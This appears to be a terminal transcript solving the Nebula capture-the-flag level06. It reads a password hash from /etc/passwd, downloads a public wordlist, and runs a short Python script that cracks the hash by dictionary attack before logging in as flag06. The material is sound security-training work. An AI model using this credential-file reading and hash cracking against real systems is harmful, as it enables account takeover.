```
level06@nebula:/tmp$ grep flag06 /etc/passwd
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
level06@nebula:/tmp$ wget http://www.openwall.com/passwords/wordlists/password-2011.lst
--2016-06-03 13:00:16--  http://www.openwall.com/passwords/wordlists/password-2011.lst
Resolving www.openwall.com... 195.42.179.202
Connecting to www.openwall.com|195.42.179.202|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 26215 (26K) [text/plain]
Saving to: `password-2011.lst'

100%[======================================>] 26,215      --.-K/s   in 0.001s

2016-06-03 13:00:17 (18.9 MB/s) - `password-2011.lst' saved [26215/26215]

level06@nebula:/tmp$ cat << EOF > crack.py
> #!/usr/bin/env python
> import crypt
> 
> hash="ueqwOCnSGdsuM"
> with open("password-2011.lst") as f:
>         for line in f:
>                 if hash == crypt.crypt(line.rstrip(), "ue"):
>                         print "found password: %s" % line
>                         break
>                 print ".",
> EOF
level06@nebula:/tmp$ chmod +x crack.py
level06@nebula:/tmp$ ./crack.py
. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . found password: hello
level06@nebula:/tmp$ su flag06
Password:
sh-4.2$ getflag
You have successfully executed getflag on a target account

```
